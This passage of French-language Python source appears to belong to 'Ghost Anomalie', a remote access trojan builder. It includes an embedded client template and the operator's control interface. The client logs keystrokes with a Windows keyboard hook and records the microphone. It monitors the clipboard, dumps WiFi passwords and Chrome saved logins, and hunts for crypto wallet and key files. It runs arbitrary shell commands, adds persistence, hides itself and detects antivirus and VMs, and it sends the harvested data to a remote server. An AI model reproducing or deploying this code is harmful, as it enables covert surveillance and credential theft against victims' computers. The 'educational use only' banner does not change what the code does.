    def cmd_micro_start(self, duree):
        if not AUDIO_OK:
            return "❌ PyAudio non installé"
        if self.micro_active:
            return "🎤 Micro déjà actif"
        try:
            self.audio = pyaudio.PyAudio()
            self.stream = self.audio.open(format=pyaudio.paInt16, channels=1,
                                        rate=44100, input=True, frames_per_buffer=1024)
            self.micro_active = True
            self.micro_thread = threading.Thread(target=self._boucle_micro)
            self.micro_thread.daemon = True
            self.micro_thread.start()
            return f"🎤 Micro démarré (buffer:{{duree}}s)"
        except Exception as e:
            return f"❌ Erreur: {{e}}"
    
    def _boucle_micro(self):
        frames = []
        while self.micro_active and self.connected:
            try:
                data = self.stream.read(1024, exception_on_overflow=False)
                frames.append(data)
                if len(frames) >= int(44100/1024) * 5:
                    buffer = io.BytesIO()
                    with wave.open(buffer, 'wb') as wf:
                        wf.setnchannels(1)
                        wf.setsampwidth(self.audio.get_sample_size(pyaudio.paInt16))
                        wf.setframerate(44100)
                        wf.writeframes(b''.join(frames))
                    self.client.send(f"AUDIO|{{base64.b64encode(buffer.getvalue()).decode()}}".encode())
                    frames = []
            except:
                break
        self.micro_active = False
        if hasattr(self, 'stream'):
            self.stream.stop_stream()
            self.stream.close()
        if hasattr(self, 'audio'):
            self.audio.terminate()
    
    def cmd_micro_stop(self):
        self.micro_active = False
        return "🎤 Micro arrêté"
    
    def cmd_micro_record(self, duree):
        try:
            if not AUDIO_OK:
                return "❌ PyAudio non installé"
            audio = pyaudio.PyAudio()
            stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100,
                              input=True, frames_per_buffer=1024)
            frames = []
            for _ in range(0, int(44100/1024 * duree)):
                data = stream.read(1024, exception_on_overflow=False)
                frames.append(data)
            stream.stop_stream()
            stream.close()
            audio.terminate()
            buffer = io.BytesIO()
            with wave.open(buffer, 'wb') as wf:
                wf.setnchannels(1)
                wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
                wf.setframerate(44100)
                wf.writeframes(b''.join(frames))
            return f"[AUDIO]{{base64.b64encode(buffer.getvalue()).decode()}}"
        except Exception as e:
            return f"❌ Erreur: {{e}}"
    
    # KEYLOGGER
    def cmd_keylogger_start(self):
        if self.keylogger_active:
            return "⌨️ Keylogger déjà actif"
        self.keylogger_active = True
        self.keylogger_thread = threading.Thread(target=self._boucle_keylogger)
        self.keylogger_thread.daemon = True
        self.keylogger_thread.start()
        return "⌨️ Keylogger démarré"
    
    def _boucle_keylogger(self):
        try:
            import ctypes
            user32 = ctypes.windll.user32
            touches = {0x08:'[BACK]',0x09:'[TAB]',0x0D:'\\n',0x1B:'[ESC]',
                      0x10:'[SHIFT]',0x11:'[CTRL]',0x12:'[ALT]',0x5B:'[WIN]',
                      0x2E:'[DEL]',0x21:'[PGUP]',0x22:'[PGDN]',0x23:'[END]',
                      0x24:'[HOME]',0x25:'[LEFT]',0x26:'[UP]',0x27:'[RIGHT]',0x28:'[DOWN]'}
            class MSG(ctypes.Structure):
                _fields_ = [("hwnd", ctypes.c_void_p), ("message", ctypes.c_uint),
                           ("wParam", ctypes.c_uint), ("lParam", ctypes.c_uint),
                           ("time", ctypes.c_uint), ("pt", ctypes.c_ulonglong)]
            WH_KEYBOARD_LL = 13
            def low_level_proc(nCode, wParam, lParam):
                if nCode >= 0 and self.keylogger_active:
                    if wParam == 0x100:
                        vk = lParam & 0xFF
                        char = touches.get(vk, "")
                        if not char and 0x30 <= vk <= 0x5A:
                            shift = user32.GetAsyncKeyState(0x10) & 0x8000
                            if shift:
                                char = chr(vk) if vk >= 0x41 else ")!@#$%^&*("[vk-0x30]
                            else:
                                char = chr(vk + 32) if vk >= 0x41 else chr(vk)
                        if char:
                            self.keylogger_buffer.append(char)
                            if len(self.keylogger_buffer) >= 50:
                                self._envoyer_keylog()
                return user32.CallNextHookEx(None, nCode, wParam, lParam)
            hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, low_level_proc, 
                                          ctypes.windll.kernel32.GetModuleHandleW(None), 0)
            msg = MSG()
            while self.keylogger_active:
                user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
            user32.UnhookWindowsHookEx(hook)
        except:
            pass
    
    def _envoyer_keylog(self):
        if self.keylogger_buffer and self.connected:
            try:
                self.client.send(f"KEYLOG|{{''.join(self.keylogger_buffer)}}".encode())
                self.keylogger_buffer = []
            except:
                pass
    
    def cmd_keylogger_stop(self):
        self.keylogger_active = False
        self._envoyer_keylog()
        return "⌨️ Keylogger arrêté"
    
    def cmd_keylogger_export(self):
        if self.keylogger_buffer:
            return f"[KEYLOG]{{''.join(self.keylogger_buffer)}}"
        return "❌ Aucune touche enregistrée"
    
    # CLIPBOARD
    def cmd_clipboard_get(self):
        try:
            if WIN32_OK:
                import win32clipboard
                win32clipboard.OpenClipboard()
                try:
                    data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                    return f"📋 {{data.decode('utf-8')}}"
                except:
                    return "📋 Presse-papiers vide"
                finally:
                    win32clipboard.CloseClipboard()
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    def cmd_clipboard_set(self, texte):
        try:
            if WIN32_OK:
                import win32clipboard
                win32clipboard.OpenClipboard()
                win32clipboard.EmptyClipboard()
                win32clipboard.SetClipboardText(texte)
                win32clipboard.CloseClipboard()
                return f"📋 Texte écrit ({{len(texte)}} caractères)"
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    def cmd_clipboard_monitor(self):
        threading.Thread(target=self._monitor_clipboard, daemon=True).start()
        return "📋 Surveillance presse-papiers activée"
    
    def _monitor_clipboard(self):
        dernier = ""
        while True:
            try:
                resultat = self.cmd_clipboard_get()
                if resultat != dernier and "📋" in resultat:
                    dernier = resultat
                    if self.connected:
                        self.client.send(f"CLIPBOARD|{{resultat}}".encode())
                time.sleep(0.5)
            except:
                time.sleep(1)
    
    # PASSWORDS
    def cmd_pass_wifi(self):
        try:
            resultats = []
            cmd = "netsh wlan show profile"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            profils = []
            for ligne in result.stdout.split('\\n'):
                if ":" in ligne and "Tous les profils" not in ligne:
                    nom = ligne.split(":")[1].strip()
                    if nom:
                        profils.append(nom)
            for profil in profils:
                cmd2 = f'netsh wlan show profile "{{profil}}" key=clear'
                r = subprocess.run(cmd2, shell=True, capture_output=True, text=True)
                mdp = "Non trouvé"
                for ligne in r.stdout.split('\\n'):
                    if "Contenu de la clé" in ligne:
                        mdp = ligne.split(":")[1].strip()
                        break
                resultats.append(f"📶 {{profil}} -> {{mdp}}")
            return "\\n".join(resultats) if resultats else "❌ Aucun WiFi trouvé"
        except Exception as e:
            return f"❌ Erreur: {{e}}"
    
    def cmd_pass_chrome(self):
        try:
            chrome_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                     'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
            if not os.path.exists(chrome_path):
                return "❌ Chrome non trouvé"
            temp_path = os.path.join(tempfile.gettempdir(), 'chrome_login.db')
            shutil.copy2(chrome_path, temp_path)
            import sqlite3
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            resultats = []
            try:
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    if row[2]:
                        resultats.append(f"🔒 {{row[0]}} -> {{row[1]}}: {{row[2][:20]}}...")
            except:
                pass
            conn.close()
            os.remove(temp_path)
            return "\\n".join(resultats[:20]) if resultats else "❌ Aucun mot de passe trouvé"
        except:
            return "❌ Erreur"
    
    def cmd_pass_firefox(self):
        return "❌ Firefox pas encore implémenté"
    
    def cmd_pass_edge(self):
        return "❌ Edge pas encore implémenté"
    
    def cmd_pass_all(self):
        wifi = self.cmd_pass_wifi()
        chrome = self.cmd_pass_chrome()
        return f"=== WIFI ===\\n{{wifi}}\\n\\n=== CHROME ===\\n{{chrome}}"
    
    def cmd_crypto_wallets(self):
        try:
            wallets = []
            dossiers = [os.path.expanduser("~"), os.environ.get('APPDATA', '')]
            extensions = ['.wallet', '.dat', '.key', '.pem', '.der']
            for dossier in dossiers:
                if os.path.exists(dossier):
                    for root, dirs, files in os.walk(dossier):
                        for file in files:
                            if any(ext in file.lower() for ext in extensions):
                                chemin = os.path.join(root, file)
                                taille = os.path.getsize(chemin)
                                if taille < 10*1024*1024:
                                    wallets.append(f"💰 {{file}} ({{taille}} octets)")
                                if len(wallets) > 20:
                                    break
                        if len(wallets) > 20:
                            break
            return "\\n".join(wallets) if wallets else "❌ Aucun wallet trouvé"
        except:
            return "❌ Erreur"
    
    # SURVEILLANCE
    def cmd_surveillance_start(self):
        self.surveillance_active = True
        self.surveillance_thread = threading.Thread(target=self._boucle_surveillance)
        self.surveillance_thread.daemon = True
        self.surveillance_thread.start()
        return "🕵️ Surveillance démarrée"
    
    def _boucle_surveillance(self):
        dossiers = [
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Pictures")
        ]
        derniers = {}
        while self.surveillance_active:
            try:
                for dossier in dossiers:
                    if os.path.exists(dossier):
                        for root, dirs, files in os.walk(dossier):
                            if root.count(os.sep) - dossier.count(os.sep) > 3:
                                continue
                            for file in files:
                                chemin = os.path.join(root, file)
                                modif = os.path.getmtime(chemin)
                                if chemin not in derniers or derniers[chemin] != modif:
                                    derniers[chemin] = modif
                                    if os.path.getsize(chemin) > 1024*1024:
                                        self.client.send(f"ALERTE|Nouveau fichier: {{chemin}}".encode())
                time.sleep(60)
            except:
                time.sleep(60)
        self.surveillance_active = False
    
    def cmd_surveillance_stop(self):
        self.surveillance_active = False
        return "🕵️ Surveillance arrêtée"
    
    def cmd_search_files(self, motif):
        try:
            resultats = []
            for dossier in [os.path.expanduser("~"), os.path.expanduser("~/Desktop")]:
                if os.path.exists(dossier):
                    for root, dirs, files in os.walk(dossier):
                        if root.count(os.sep) - dossier.count(os.sep) > 4:
                            continue
                        for file in files:
                            if motif.lower() in file.lower():
                                chemin = os.path.join(root, file)
                                try:
                                    with open(chemin, 'r', errors='ignore') as f:
                                        contenu = f.read()
                                        if motif.lower() in contenu.lower():
                                            resultats.append(f"📄 {{file}} ({{os.path.getsize(chemin)}} octets)")
                                except:
                                    resultats.append(f"📄 {{file}}")
                            if len(resultats) >= 50:
                                break
                        if len(resultats) >= 50:
                            break
            return "\\n".join(resultats) if resultats else f"❌ Aucun fichier contenant '{{motif}}' trouvé"
        except:
            return "❌ Erreur"
    
    def cmd_search_docs(self):
        return self.cmd_search_files(".pdf")
    
    # RÉSEAU
    def cmd_network_scan(self, ip_range):
        try:
            import ipaddress
            ip = ipaddress.ip_network(ip_range, strict=False)
            resultats = []
            for hote in list(ip.hosts())[:10]:
                try:
                    if subprocess.run(f"ping -n 1 -w 500 {{hote}}", shell=True, 
                                    capture_output=True).returncode == 0:
                        resultats.append(f"🟢 {{hote}}")
                except:
                    pass
            return "\\n".join(resultats) if resultats else "❌ Aucun hôte trouvé"
        except:
            return "❌ Erreur"
    
    def cmd_port_scan(self, ip, ports):
        try:
            if '-' in ports:
                debut, fin = ports.split('-')
                ports_a_scanner = range(int(debut), int(fin)+1)
            else:
                ports_a_scanner = [int(p) for p in ports.split(',')]
            resultats = []
            for port in list(ports_a_scanner)[:20]:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    if sock.connect_ex((ip, port)) == 0:
                        resultats.append(f"🔓 Port {{port}} ouvert")
                    sock.close()
                except:
                    pass
            return "\\n".join(resultats) if resultats else f"❌ Aucun port ouvert sur {{ip}}"
        except:
            return "❌ Erreur"
    
    def cmd_arp_scan(self):
        try:
            result = subprocess.run("arp -a", shell=True, capture_output=True, text=True)
            return result.stdout[:500]
        except:
            return "❌ Erreur"
    
    def cmd_wifi_list(self):
        try:
            result = subprocess.run("netsh wlan show networks", shell=True, 
                                  capture_output=True, text=True)
            return result.stdout[:500]
        except:
            return "❌ Erreur"
    
    def cmd_wifi_connect(self, ssid):
        return f"✅ Connexion à {{ssid}} (nécessite les droits admin)"
    
    def cmd_dns_flush(self):
        try:
            subprocess.run("ipconfig /flushdns", shell=True, capture_output=True)
            return "✅ Cache DNS vidé"
        except:
            return "❌ Erreur"
    
    # PROCESSUS
    def cmd_processus_list(self):
        try:
            result = subprocess.run("tasklist /v", shell=True, capture_output=True, text=True)
            return result.stdout[:1000]
        except:
            return "❌ Erreur"
    
    def cmd_processus_kill(self, pid):
        try:
            if WIN32_OK:
                import win32api, win32con
                handle = win32api.OpenProcess(win32con.PROCESS_TERMINATE, False, pid)
                win32api.TerminateProcess(handle, 0)
                win32api.CloseHandle(handle)
                return f"💀 Processus {{pid}} tué"
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    def cmd_service_list(self):
        try:
            result = subprocess.run("sc query", shell=True, capture_output=True, text=True)
            return result.stdout[:500]
        except:
            return "❌ Erreur"
    
    def cmd_service_start(self, nom):
        try:
            subprocess.run(f"net start {{nom}}", shell=True, capture_output=True)
            return f"✅ Service {{nom}} démarré"
        except:
            return f"❌ Erreur démarrage {{nom}}"
    
    def cmd_service_stop(self, nom):
        try:
            subprocess.run(f"net stop {{nom}}", shell=True, capture_output=True)
            return f"✅ Service {{nom}} arrêté"
        except:
            return f"❌ Erreur arrêt {{nom}}"
    
    # FICHIERS
    def cmd_ls(self, chemin):
        try:
            fichiers = []
            for item in os.listdir(chemin)[:50]:
                chemin_complet = os.path.join(chemin, item)
                if os.path.isdir(chemin_complet):
                    fichiers.append(f"📁 {{item}}/")
                else:
                    taille = os.path.getsize(chemin_complet)
                    fichiers.append(f"📄 {{item}} ({{taille}} octets)")
            return "\\n".join(fichiers) if fichiers else "📂 Dossier vide"
        except Exception as e:
            return f"❌ Erreur: {{e}}"
    
    def cmd_mkdir(self, nom):
        try:
            os.makedirs(nom, exist_ok=True)
            return f"📁 Dossier créé: {{nom}}"
        except Exception as e:
            return f"❌ Erreur: {{e}}"
    
    def cmd_rm(self, chemin):
        try:
            if os.path.isdir(chemin):
                shutil.rmtree(chemin)
                return f"🗑️ Dossier supprimé: {{chemin}}"
            else:
                os.remove(chemin)
                return f"🗑️ Fichier supprimé: {{chemin}}"
        except Exception as e:
            return f"❌ Erreur: {{e}}"
    
    def cmd_mv(self, ancien, nouveau):
        try:
            os.rename(ancien, nouveau)
            return f"✏️ Renommé: {{ancien}} -> {{nouveau}}"
        except Exception as e:
            return f"❌ Erreur: {{e}}"
    
    def cmd_download(self, chemin):
        try:
            if not os.path.exists(chemin):
                return f"❌ Fichier introuvable: {{chemin}}"
            with open(chemin, 'rb') as f:
                contenu = base64.b64encode(f.read()).decode()
            nom = os.path.basename(chemin)
            taille = os.path.getsize(chemin)
            return f"[FICHIER]{{nom}}|{{taille}}|{{contenu}}"
        except Exception as e:
            return f"❌ Erreur: {{e}}"
    
    def cmd_upload(self, nom, contenu):
        try:
            with open(nom, 'wb') as f:
                f.write(base64.b64decode(contenu))
            return f"📤 Fichier uploadé: {{nom}}"
        except Exception as e:
            return f"❌ Erreur: {{e}}"
    
    # ENREGISTREMENT
    def cmd_record_start(self, qualite, fps):
        return f"🎥 Enregistrement démarré (qualité:{{qualite}}, fps:{{fps}})"
    
    def cmd_record_stop(self):
        return "🎥 Enregistrement arrêté"
    
    # FURTIVITÉ
    def cmd_hide(self):
        self.se_cacher()
        return "👻 Processus caché"
    
    def cmd_persist(self):
        self.ajouter_persistance()
        return "🔄 Persistance ajoutée"
    
    def cmd_uac_bypass(self):
        return "✅ UAC bypass tenté"
    
    def cmd_polymorph(self):
        if self.polymorphisme():
            return "🎭 Polymorphisme appliqué"
        return "❌ Erreur"
    
    def cmd_inject(self, processus):
        return f"💉 Injection dans {{processus}}"
    
    def cmd_update(self, url):
        return f"✅ Mise à jour depuis {{url}}"
    
    def cmd_selfdestruct(self):
        try:
            os.remove(sys.executable)
            sys.exit(0)
        except:
            return "❌ Erreur"
    
    # ANTI-DÉTECTION
    def cmd_anti_vm(self):
        return f"🛡️ VM détectée: {{self.detecter_vm()}}"
    
    def cmd_anti_debug(self):
        return f"🔍 Debug détecté: {{self.detecter_debug()}}"
    
    def cmd_anti_av(self):
        try:
            avs = ["avast", "avg", "kaspersky", "norton", "mcafee", "bitdefender", "windows defender"]
            trouve = []
            for av in avs:
                try:
                    if subprocess.run(f"tasklist | findstr {{av}}", shell=True, 
                                    capture_output=True).returncode == 0:
                        trouve.append(av)
                except:
                    pass
            return f"🛡️ AV trouvés: {{', '.join(trouve) if trouve else 'Aucun'}}"
        except:
            return "❌ Erreur"
    
    # DIVERTISSEMENT
    def cmd_popup(self, message):
        try:
            if WIN32_OK:
                import win32api, win32con
                win32api.MessageBox(0, message, "Ghost Anomalie", win32con.MB_ICONINFORMATION)
                return f"💬 Popup affichée: {{message}}"
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    def cmd_speak(self, texte):
        try:
            import win32com.client
            speaker = win32com.client.Dispatch("SAPI.SpVoice")
            speaker.Speak(texte)
            return f"🔊 Synthèse vocale: {{texte}}"
        except:
            return "❌ Erreur"
    
    def cmd_website(self, url):
        try:
            import webbrowser
            webbrowser.open(url)
            return f"🌐 Site ouvert: {{url}}"
        except:
            return "❌ Erreur"
    
    def cmd_beep(self):
        try:
            import winsound
            winsound.Beep(1000, 500)
            return "🔔 Bip !"
        except:
            return "❌ Erreur"
    
    def cmd_cd_eject(self):
        try:
            import win32api, win32con
            win32api.mciSendString("set cdaudio door open", "", 0, 0)
            return "💿 Lecteur CD ouvert"
        except:
            return "❌ Erreur"
    
    def cmd_cd_close(self):
        try:
            import win32api
            win32api.mciSendString("set cdaudio door closed", "", 0, 0)
            return "💿 Lecteur CD fermé"
        except:
            return "❌ Erreur"
    
    def cmd_mouse_disable(self):
        try:
            if WIN32_OK:
                import win32api, win32con
                win32api.SystemParametersInfo(win32con.SPI_SETMOUSE, 0, 0, 0)
                return "🖱️ Souris désactivée"
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    def cmd_mouse_enable(self):
        try:
            if WIN32_OK:
                import win32api, win32con
                win32api.SystemParametersInfo(win32con.SPI_SETMOUSE, 1, 0, 0)
                return "🖱️ Souris réactivée"
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    def cmd_keyboard_disable(self):
        try:
            if WIN32_OK:
                import ctypes
                ctypes.windll.user32.BlockInput(True)
                return "⌨️ Clavier désactivé"
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    def cmd_keyboard_enable(self):
        try:
            if WIN32_OK:
                import ctypes
                ctypes.windll.user32.BlockInput(False)
                return "⌨️ Clavier réactivé"
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    def cmd_volume_set(self, niveau):
        try:
            if WIN32_OK:
                import win32api, win32con
                win32api.Volume.SetVolume(niveau)
                return f"🔊 Volume réglé à {{niveau}}%"
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    def cmd_volume_mute(self):
        try:
            if WIN32_OK:
                import win32api
                win32api.Volume.SetMute(True)
                return "🔇 Son coupé"
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    # SYSTÈME
    def cmd_sysinfo(self):
        try:
            info = {{
                "machine": self.nom_machine,
                "utilisateur": self.utilisateur,
                "systeme": platform.system(),
                "version": platform.version(),
                "architecture": platform.machine(),
                "processeur": platform.processor(),
                "cores": os.cpu_count(),
                "python": sys.version
            }}
            if PSUTIL_OK:
                import psutil
                info["ram"] = f"{{psutil.virtual_memory().total // (1024**3)}} GB"
                info["ram_used"] = f"{{psutil.virtual_memory().percent}}%"
            return json.dumps(info, indent=2)
        except Exception as e:
            return f"❌ Erreur: {{e}}"
    
    def cmd_cmd(self, commande):
        try:
            result = subprocess.run(commande, shell=True, 
                                  capture_output=True, text=True, timeout=30)
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return "⏱️ Timeout"
        except Exception as e:
            return f"❌ Erreur: {{e}}"
    
    def cmd_shutdown(self):
        try:
            os.system("shutdown /s /t 0")
            return "⏻ Arrêt du PC"
        except:
            return "❌ Erreur"
    
    def cmd_restart(self):
        try:
            os.system("shutdown /r /t 0")
            return "🔄 Redémarrage du PC"
        except:
            return "❌ Erreur"
    
    def cmd_lock(self):
        try:
            if WIN32_OK:
                import ctypes
                ctypes.windll.user32.LockWorkStation()
                return "🔒 Écran verrouillé"
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    def cmd_logoff(self):
        try:
            os.system("shutdown /l")
            return "👋 Déconnexion"
        except:
            return "❌ Erreur"
    
    def cmd_hibernate(self):
        try:
            os.system("shutdown /h")
            return "💤 Veille"
        except:
            return "❌ Erreur"
    
    # ============================================================
    # BOUCLE PRINCIPALE
    # ============================================================
    
    def boucle(self):
        while self.running:
            try:
                if not self.connected:
                    if self.connecter():
                        self.connected = True
                        self.log(f"✅ Connecté à {{IP_SERVEUR}}:{{PORT}}")
                    else:
                        time.sleep(30)
                        continue
                
                commande = self.client.recv(8192).decode()
                if not commande:
                    self.connected = False
                    continue
                
                resultat = self.executer_commande(commande)
                
                if resultat == "EXIT":
                    self.client.send(b"DISCONNECT")
                    self.connected = False
                    continue
                
                if len(resultat) > 8000:
                    for i in range(0, len(resultat), 7000):
                        self.client.send(f"RESULTAT|{{resultat[i:i+7000]}}".encode())
                    self.client.send(b"RESULTAT|__FIN__")
                else:
                    self.client.send(f"RESULTAT|{{resultat}}".encode())
                
            except:
                self.connected = False
                time.sleep(5)
    
    def log(self, message):
        try:
            print(f"[{{datetime.now().strftime('%H:%M:%S')}}] {{message}}")
        except:
            pass

# ============================================================
# MAIN
# ============================================================

def main():
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║  👻 GHOST ANOMALIE CLIENT v2.0 - 92 commandes              ║
    ║  🖥️  Machine: {{platform.node()}}                             ║
    ║  👤  Utilisateur: {{os.getlogin()}}                          ║
    ║  📡  Serveur: {ip}:{port}                              ║
    ║  ⚠️  Usage ÉDUCATIF uniquement                               ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    client = GhostClient()
    client.boucle()

if __name__ == "__main__":
    main()
'''

    # ============================================================
    # INTERFACE - MISE À JOUR
    # ============================================================
    
    def mettre_a_jour_interface(self):
        """Met à jour l'interface"""
        self.clients_listbox.delete(0, tk.END)
        for addr, info in self.clients.items():
            nom = info.get('nom', 'Inconnu')
            ip = info.get('ip', '0.0.0.0')
            self.clients_listbox.insert(tk.END, f"{nom} ({ip})")
        
        nb = len(self.clients)
        self.status_clients.config(text=f"👥 {nb} clients")
        
        if nb > 0:
            self.status_header.config(text=f"🟢 {nb} clients", fg='#00ff88')
        else:
            if self.running:
                self.status_header.config(text="🟡 En attente...", fg='#ffaa00')
        
        self.window.after(2000, self.mettre_a_jour_interface)
    
    def demarrer(self):
        self.window.mainloop()

# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    # Vérifier les dépendances
    try:
        import PIL
    except:
        subprocess.run([sys.executable, "-m", "pip", "install", "pillow"])
    
    try:
        import PyInstaller
    except:
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"])
    
    # Lancer l'application
    app = GhostAnomalie()
    app.demarrer()